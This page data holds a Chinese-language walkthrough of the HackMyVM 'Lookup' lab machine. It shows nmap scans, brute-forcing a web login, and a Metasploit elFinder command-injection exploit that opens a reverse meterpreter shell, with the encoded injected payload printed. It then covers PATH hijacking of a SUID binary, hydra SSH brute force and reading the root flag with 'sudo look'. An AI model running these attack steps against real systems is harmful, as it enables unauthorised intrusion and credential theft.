{"pageProps":{"postData":{"id":"HackMyVMLookup","contentHtml":"<h1>Lookup.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Lookup\">https://hackmyvm.eu/machines/machine.php?vm=Lookup</a></p>\n</blockquote>\n<p>Notes: <strong>Enjoy it.</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/test/test  nmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>                      \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">21</span> 03:<span class=\"hljs-number\">21</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00069</span>s latency).\nMAC Address: 0A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00044</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:D5:<span class=\"hljs-number\">61</span>:<span class=\"hljs-number\">82</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> www.smol.hmv (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>)\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00051</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:E7:07:A1 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\nHost <span class=\"hljs-keyword\">is</span> up.\nNmap done: <span class=\"hljs-number\">256</span> IP addresses (<span class=\"hljs-number\">4</span> hosts up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">15.08</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/test/test  nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>                          \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">21</span> 03:<span class=\"hljs-number\">26</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> www.smol.hmv (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>)\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00051</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:E7:07:A1 (Oracle VirtualBox virtual NIC)\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">4.14</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/test/test  nmap -sT -A -T4 -O -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span> \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">21</span> 03:<span class=\"hljs-number\">26</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> www.smol.hmv (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>)\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00053</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">8.2</span>p1 Ubuntu 4ubuntu0<span class=\"hljs-number\">.9</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">3072</span> <span class=\"hljs-number\">44</span>:5f:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">67</span>:4b:4a:<span class=\"hljs-number\">91</span>:9b:<span class=\"hljs-number\">59</span>:7a:<span class=\"hljs-number\">95</span>:<span class=\"hljs-number\">59</span>:c8:4c:2e:04 (RSA)\n|   <span class=\"hljs-number\">256</span> 0a:4b:b9:b1:<span class=\"hljs-number\">77</span>:d2:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">79</span>:fc:2f:8a:3d:<span class=\"hljs-number\">64</span>:3a:ad:<span class=\"hljs-number\">94</span> (ECDSA)\n|_  <span class=\"hljs-number\">256</span> d3:3b:<span class=\"hljs-number\">97</span>:ea:<span class=\"hljs-number\">54</span>:bc:<span class=\"hljs-number\">41</span>:4d:03:<span class=\"hljs-number\">39</span>:f6:8f:ad:b6:a0:fb (ED25519)\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.41</span> ((Ubuntu))\n|_http-title: Did <span class=\"hljs-keyword\">not</span> follow redirect to http://lookup.hmv\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.41</span> (Ubuntu)\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:E7:07:A1 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.53</span> ms www.smol.hmv (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>)\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">8.37</span> seconds\n</code></pre>\n<p>访问<code>HTTP</code>服务，并收集指纹</p>\n<p><img src=\"/post-images/HackMyVMLookup/image118.png\" alt=\"image.png\"></p>\n<h2>Brute</h2>\n<p>尝试了<code>SQL</code>注入等常规操作后无结果</p>\n<p>尝试了用户<code>admin</code>，爆破密码，最后<code>password123</code>的数据包和别的数据包返回不一样</p>\n<p><img src=\"/post-images/HackMyVMLookup/image119.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMLookup/image120.png\" alt=\"image.png\"></p>\n<p>那么密码应该是对的，现在继续爆破用户名</p>\n<p><img src=\"/post-images/HackMyVMLookup/image121.png\" alt=\"image.png\"></p>\n<p>得到用户名密码<code>jose:password123</code> ,登陆后跳转到<code>files.lookup.hmv</code> ，将其添加到<code>hosts</code>文件</p>\n<h2>后台利用</h2>\n<p>登陆进去后，是一个文件管理的系统<code>elFinder</code></p>\n<p><img src=\"/post-images/HackMyVMLookup/image122.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMLookup/image123.png\" alt=\"image.png\"></p>\n<p>搜索漏洞，刚好靶机的版本存在远程命令执行漏洞</p>\n<p><img src=\"/post-images/HackMyVMLookup/image124.png\" alt=\"image.png\"></p>\n<p><code>MSF</code>搜索，并利用</p>\n<pre><code class=\"hljs language-python\">msf6 > search elFinder\n                                                         \nMatching Modules                                \n================                                                                                                  \n                                                         \n   <span class=\"hljs-comment\">#  Name                                                               Disclosure Date  Rank       Check  Description</span>\n   -  ----                                                               ---------------  ----       -----  -----------\n   <span class=\"hljs-number\">0</span>  exploit/multi/http/builderengine_upload_exec                       <span class=\"hljs-number\">2016</span>-09-<span class=\"hljs-number\">18</span>       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability <span class=\"hljs-keyword\">and</span> execution\n   <span class=\"hljs-number\">1</span>  exploit/unix/webapp/tikiwiki_upload_exec                           <span class=\"hljs-number\">2016</span>-07-<span class=\"hljs-number\">11</span>       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability\n   <span class=\"hljs-number\">2</span>  exploit/multi/http/wp_file_manager_rce                             <span class=\"hljs-number\">2020</span>-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution\n   <span class=\"hljs-number\">3</span>  exploit/linux/http/elfinder_archive_cmd_injection                  <span class=\"hljs-number\">2021</span>-06-<span class=\"hljs-number\">13</span>       excellent  Yes    elFinder Archive Command Injection\n   <span class=\"hljs-number\">4</span>  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  <span class=\"hljs-number\">2019</span>-02-<span class=\"hljs-number\">26</span>       excellent  Yes    elFinder PHP Connector exiftran Command Injection\n\nInteract <span class=\"hljs-keyword\">with</span> a module by name <span class=\"hljs-keyword\">or</span> index. For example info <span class=\"hljs-number\">4</span>, use <span class=\"hljs-number\">4</span> <span class=\"hljs-keyword\">or</span> use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection\n\nmsf6 > use <span class=\"hljs-number\">4</span>\n[*] No payload configured, defaulting to php/meterpreter/reverse_tcp\nmsf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > options\n\nModule options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   Proxies                     no        A proxy chain of <span class=\"hljs-built_in\">format</span> <span class=\"hljs-built_in\">type</span>:host:port[,<span class=\"hljs-built_in\">type</span>:host:port][...]\n   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT      <span class=\"hljs-number\">80</span>               yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS <span class=\"hljs-keyword\">for</span> outgoing connections\n   TARGETURI  /elFinder/       yes       The base path to elFinder\n   VHOST                       no        HTTP server virtual host\n\nPayload options (php/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>     yes       The listen address (an interface may be specified)\n   LPORT  <span class=\"hljs-number\">4444</span>             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   <span class=\"hljs-number\">0</span>   Auto\n\nView the full module info <span class=\"hljs-keyword\">with</span> the info, <span class=\"hljs-keyword\">or</span> info -d command.\n\nmsf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>\nrhosts => <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>  \nmsf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > <span class=\"hljs-built_in\">set</span> vhost files.lookup.hmv\nvhost => files.lookup.hmv    \nmsf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run\n\n[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>:<span class=\"hljs-number\">4444</span> \n[*] Uploading payload <span class=\"hljs-string\">'adB6JwtTYi.jpg;echo 6370202e2e2f66696c65732f616442364a77745459692e6a70672a6563686f2a202e5a5258637867743064302e706870 |xxd -r -p |sh&#x26; #.jpg'</span> (<span class=\"hljs-number\">1953</span> <span class=\"hljs-built_in\">bytes</span>)\n[*] Triggering vulnerability via image rotation ...\n[*] Executing payload (/elFinder/php/.ZRXcxgt0d0.php) ...\n[*] Sending stage (<span class=\"hljs-number\">40004</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>\n[+] Deleted .ZRXcxgt0d0.php\n[*] Meterpreter session <span class=\"hljs-number\">1</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>:<span class=\"hljs-number\">4444</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>:<span class=\"hljs-number\">39778</span>) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">21</span> 04:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">57</span> -0500\n[*] No reply\n[*] Removing uploaded file ...\n[+] Deleted uploaded file\n\nmeterpreter >                                                                                                    \n</code></pre>\n<h2>提权 - think</h2>\n<p>先信息收集一波</p>\n<pre><code class=\"hljs language-python\">$ uname -a\nLinux lookup <span class=\"hljs-number\">5.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">156</span>-generic <span class=\"hljs-comment\">#173-Ubuntu SMP Tue Jul 11 07:25:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>\n\n$ ip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=\"hljs-number\">1000</span>\n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: enp0s17: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc fq_codel state UP group default qlen <span class=\"hljs-number\">1000</span>\n    link/ether 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:e7:07:a1 brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> dynamic enp0s17\n       valid_lft 456sec preferred_lft 456sec\n    inet6 fe80::a00:27ff:fee7:7a1/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n       \n $ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f <span class=\"hljs-number\">2</span>>/dev/null\n/snap/snapd/<span class=\"hljs-number\">19457</span>/usr/lib/snapd/snap-confine\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/<span class=\"hljs-built_in\">bin</span>/chfn\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/<span class=\"hljs-built_in\">bin</span>/chsh\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/<span class=\"hljs-built_in\">bin</span>/gpasswd\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/<span class=\"hljs-built_in\">bin</span>/mount\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/<span class=\"hljs-built_in\">bin</span>/newgrp\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/<span class=\"hljs-built_in\">bin</span>/passwd\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/<span class=\"hljs-built_in\">bin</span>/su\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/<span class=\"hljs-built_in\">bin</span>/sudo\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/<span class=\"hljs-built_in\">bin</span>/umount\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper\n/snap/core20/<span class=\"hljs-number\">1950</span>/usr/lib/openssh/ssh-keysign\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/<span class=\"hljs-built_in\">bin</span>/chfn\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/<span class=\"hljs-built_in\">bin</span>/chsh\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/<span class=\"hljs-built_in\">bin</span>/gpasswd\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/<span class=\"hljs-built_in\">bin</span>/mount\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/<span class=\"hljs-built_in\">bin</span>/newgrp\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/<span class=\"hljs-built_in\">bin</span>/passwd\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/<span class=\"hljs-built_in\">bin</span>/su\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/<span class=\"hljs-built_in\">bin</span>/sudo\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/<span class=\"hljs-built_in\">bin</span>/umount\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper\n/snap/core20/<span class=\"hljs-number\">1974</span>/usr/lib/openssh/ssh-keysign\n/usr/lib/policykit-<span class=\"hljs-number\">1</span>/polkit-agent-helper-<span class=\"hljs-number\">1</span>\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper\n/usr/sbin/pwm\n/usr/<span class=\"hljs-built_in\">bin</span>/at\n/usr/<span class=\"hljs-built_in\">bin</span>/fusermount\n/usr/<span class=\"hljs-built_in\">bin</span>/gpasswd\n/usr/<span class=\"hljs-built_in\">bin</span>/chfn\n/usr/<span class=\"hljs-built_in\">bin</span>/sudo\n/usr/<span class=\"hljs-built_in\">bin</span>/chsh\n/usr/<span class=\"hljs-built_in\">bin</span>/passwd\n/usr/<span class=\"hljs-built_in\">bin</span>/mount\n/usr/<span class=\"hljs-built_in\">bin</span>/su\n/usr/<span class=\"hljs-built_in\">bin</span>/newgrp\n/usr/<span class=\"hljs-built_in\">bin</span>/pkexec\n/usr/<span class=\"hljs-built_in\">bin</span>/umount\n</code></pre>\n<p>看见一个没见过的<code>pwm</code> ，执行看看，好像是要找到<code>.passwords</code>文件，但是该用户没有家目录</p>\n<pre><code class=\"hljs language-python\">$ pwm\n[!] Running <span class=\"hljs-string\">'id'</span> command to extract the username <span class=\"hljs-keyword\">and</span> user ID (UID)\n[!] ID: www-data\n[-] File /home/www-data/.passwords <span class=\"hljs-keyword\">not</span> found\n</code></pre>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">$ ls -al /usr/sbin/pwm\n-rwsr-sr-x <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">17176</span> Jan <span class=\"hljs-number\">11</span>  <span class=\"hljs-number\">2024</span> /usr/sbin/pwm\n</code></pre>\n<p>将文件拉取到靶机</p>\n<p><img src=\"/post-images/HackMyVMLookup/image125.png\" alt=\"image.png\"></p>\n<p><code>IDA</code>分析</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">int</span> __fastcall main(<span class=\"hljs-built_in\">int</span> argc, const char **argv, const char **envp)\n{\n  char v4; // [rsp+Fh] [rbp-131h]\n  FILE *stream; // [rsp+10h] [rbp-130h]\n  FILE *v6; // [rsp+18h] [rbp-128h]\n  char v7[<span class=\"hljs-number\">64</span>]; // [rsp+20h] [rbp-120h] BYREF\n  char s[<span class=\"hljs-number\">112</span>]; // [rsp+60h] [rbp-E0h] BYREF\n  char filename[<span class=\"hljs-number\">104</span>]; // [rsp+D0h] [rbp-70h] BYREF\n  unsigned __int64 v10; // [rsp+138h] [rbp-8h]\n\n  v10 = __readfsqword(0x28u);\n  puts(<span class=\"hljs-string\">\"[!] Running 'id' command to extract the username and user ID (UID)\"</span>);\n  snprintf(s, 0x64uLL, <span class=\"hljs-string\">\"id\"</span>);\n  stream = popen(s, <span class=\"hljs-string\">\"r\"</span>);\n  <span class=\"hljs-keyword\">if</span> ( stream )\n  {\n    <span class=\"hljs-keyword\">if</span> ( (unsigned <span class=\"hljs-built_in\">int</span>)__isoc99_fscanf(stream, <span class=\"hljs-string\">\"uid=%*u(%[^)])\"</span>, v7) == <span class=\"hljs-number\">1</span> )\n    {\n      printf(<span class=\"hljs-string\">\"[!] ID: %s\\n\"</span>, v7);\n      pclose(stream);\n      snprintf(filename, 0x64uLL, <span class=\"hljs-string\">\"/home/%s/.passwords\"</span>, v7);\n      v6 = fopen(filename, <span class=\"hljs-string\">\"r\"</span>);\n      <span class=\"hljs-keyword\">if</span> ( v6 )\n      {\n        <span class=\"hljs-keyword\">while</span> ( <span class=\"hljs-number\">1</span> )\n        {\n          v4 = fgetc(v6);\n          <span class=\"hljs-keyword\">if</span> ( v4 == -<span class=\"hljs-number\">1</span> )\n            <span class=\"hljs-keyword\">break</span>;\n          putchar(v4);\n        }\n        fclose(v6);\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n      }\n      <span class=\"hljs-keyword\">else</span>\n      {\n        printf(<span class=\"hljs-string\">\"[-] File /home/%s/.passwords not found\\n\"</span>, v7);\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n      }\n    }\n    <span class=\"hljs-keyword\">else</span>\n    {\n      perror(<span class=\"hljs-string\">\"[-] Error reading username from id command\\n\"</span>);\n      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;\n    }\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    perror(<span class=\"hljs-string\">\"[-] Error executing id command\\n\"</span>);\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;\n  }\n\t}\n</code></pre>\n<p><code>stream = popen(s, \"r\");</code> 使用 <code>popen</code> 函数执行 <code>id</code> 命令，并返回一个 <code>FILE *</code> 指针，表示命令的标准输出流</p>\n<p>但是<code>id</code>并没有使用绝对路径，我们可以劫持</p>\n<pre><code class=\"hljs language-python\">$ echo <span class=\"hljs-string\">\"#!/bin/bash\"</span> > <span class=\"hljs-built_in\">id</span>\n$ echo <span class=\"hljs-string\">\"echo 'uid=1000(think) gid=1000(think) groups=1000(think)'\"</span> >> <span class=\"hljs-built_in\">id</span>\n$ cat <span class=\"hljs-built_in\">id</span>\n<span class=\"hljs-comment\">#!/bin/bash</span>\necho <span class=\"hljs-string\">'uid=1000(think) gid=1000(think) groups=1000(think)'</span>\n$ export PATH=<span class=\"hljs-string\">\"/tmp:$PATH\"</span>\n$ chmod +x <span class=\"hljs-built_in\">id</span>\n</code></pre>\n<p>劫持后是一字典</p>\n<pre><code class=\"hljs language-python\">$ pwm                                     \n[!] Running <span class=\"hljs-string\">'id'</span> command to extract the username <span class=\"hljs-keyword\">and</span> user ID (UID)\n[!] ID: think\njose1006\njose1004\njose1002\njose1001teles\njose100190\njose10001\njose10.asd\njose10+\njose0_07\njose0990\njose0986$\njose098130443\njose0981\njose0924\njose0923\njose0921\nthepassword\njose(<span class=\"hljs-number\">1993</span>)\njose<span class=\"hljs-string\">'sbabygurl\njose&#x26;vane\njose&#x26;takie\njose&#x26;samantha\njose&#x26;pam\njose&#x26;jlo\njose&#x26;jessica\njose&#x26;jessi\njosemario.AKA(think)\njose.medina.\njose.mar\njose.luis.24.oct\njose.line\njose.leonardo100\njose.leas.30\njose.ivan\njose.i22\njose.hm\njose.hater\njose.fa\njose.f\njose.dont\njose.d\njose.com}\njose.com\njose.chepe_06\njose.a91\njose.a\njose.96.\njose.9298\njose.2856171                 \n</span></code></pre>\n<p>拿到字典后保存为<code>pass.txt</code>开始爆破<code>SSH</code></p>\n<pre><code class=\"hljs language-python\"> ⚡ root@kali  ~/Desktop/test/lookup  hydra -l think -P <span class=\"hljs-keyword\">pass</span>.txt -Vv  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span> -t <span class=\"hljs-number\">16</span> ssh\n [<span class=\"hljs-number\">22</span>][ssh] host: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>   login: think   password: josemario.AKA(think)\n</code></pre>\n<p>得到密码<code>josemario.AKA(think)</code></p>\n<h2>提权 - root</h2>\n<p>登录<code>ssh</code></p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/test/lookup  ssh think@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>            \nthink@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span><span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri 21 Feb 2025 06:16:13 PM UTC\n\n  System load:  0.0               Processes:                201\n  Usage of /:   60.4% of 9.75GB   Users logged in:          0\n  Memory usage: 39%               IPv4 address for enp0s17: 192.168.56.16\n  Swap usage:   0%\n\n * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s\n   just raised the bar for easy, resilient and secure K8s cluster deployment.\n\n   https://ubuntu.com/engage/secure-kubernetes-at-the-edge\n\nExpanded Security Maintenance for Applications is not enabled.\n\n7 updates can be applied immediately.\nTo see these additional updates run: apt list --upgradable\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Thu Jan 11 20:17:32 2024 from 192.168.1.13\nthink@lookup:~$ \n</span></code></pre>\n<p>当前目录读取到<code>UserFlag</code></p>\n<pre><code class=\"hljs language-python\">think@lookup:~$ cat user.txt \n38375fb4dd8baa2b2039ac03d92b820e\n</code></pre>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">think@lookup:~$ sudo -l\n[sudo] password <span class=\"hljs-keyword\">for</span> think: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> think on lookup:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser think may run the following commands on lookup:\n    (ALL) /usr/<span class=\"hljs-built_in\">bin</span>/look\n</code></pre>\n<p>直接读取RootFlag</p>\n<pre><code class=\"hljs language-python\">think@lookup:~$ sudo look <span class=\"hljs-string\">''</span> /root/root.txt\n5a285a9f257e45c68bb6c9f9f57d18e8\n</code></pre>","title":"HackMyVM - Lookup","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Lookup.\n\n https://hackmyvm.eu/machines/machine.php?vm=Lookup\n \n\nNotes: Enjoy it.\n\n前期踩点\n\n\n\n\n\n\n\n访问`HTTP`服务，并收集指纹\n\n\n\nBrute\n\n尝试了`SQL`注入等常规操作后无结果\n\n尝试了用户`admin`，爆破密码，最后`password123`的数据包和别的数据包返回不一样\n\n\n\n\n\n那么密码..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - 